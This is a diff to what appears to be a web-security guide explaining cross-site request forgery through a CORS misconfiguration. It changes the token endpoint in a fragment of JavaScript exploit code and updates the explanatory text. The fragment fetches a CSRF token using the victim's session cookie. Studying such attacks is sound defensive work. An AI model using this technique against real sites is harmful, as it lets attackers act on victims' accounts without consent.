@@ -187,7 +187,7 @@
   ```html
   <script>
     async function exploitCSRF() {
-      const csrfToken = await fetch("https://vulnerable.tbl/csrf-token", {
+      const csrfToken = await fetch("https://vulnerable.tbl/api/csrf-token", {
         method: "GET",
         credentials: "include" // Sends victim's session cookie
       })
@@ -209,7 +209,7 @@
   </script>
   ```
 
-  * In this case, as can be seen, the CSRF token is retrieved from a web application endpoint rather than being embedded as a hidden input field in an HTML form.
+  * In this case, as can be seen, the CSRF token is retrieved from the web application endpoint `/api/csrf-token` rather than being embedded as a hidden input field in an HTML form.
   * It also includes the CSRF token in the `X-CSRF-Token` header, requiring the CORS policy to explicitly allow `X-CSRF-Token` via `Access-Control-Allow-Headers: X-CSRF-Token`, otherwise the browser will block the request before reaching the server.
   * Similarly, if `POST` method is not permitted in `Access-Control-Allow-Methods: POST`, the web application's CORS policy will cause the browser to block preflighted cross-origin POST requests.
 
